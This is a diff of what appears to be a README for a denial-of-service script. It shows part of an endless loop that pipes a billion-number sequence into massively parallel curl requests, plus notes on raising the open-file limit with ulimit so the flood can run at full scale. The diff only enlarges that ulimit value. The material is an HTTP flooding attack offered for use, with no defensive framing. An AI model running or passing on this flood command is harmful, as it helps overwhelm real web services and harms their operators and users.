@@ -18,7 +18,7 @@ while (true); do seq 1 1000000000 | xargs -n1 -P 1000000000 curl -s -H "Connecti
 **Note 1:** Reduce the numbers from **1000000000** if your system crashes. It's the number of parallel requests fired (opened files allowed) at once. Or check **Note 2**.  
 **Note 2:** To bypass **open file limit (No file descriptors available)** run the following code before running the above code (put some more Zeros if you want to, at your own risk :P) ...  
 ```
-ulimit -n 10000000000
+ulimit -n 10000000000000000000
 ```
 or try out the solutions in  
 **https://epi052.github.io/feroxbuster-docs/docs/faq/no-file-descriptors/**  
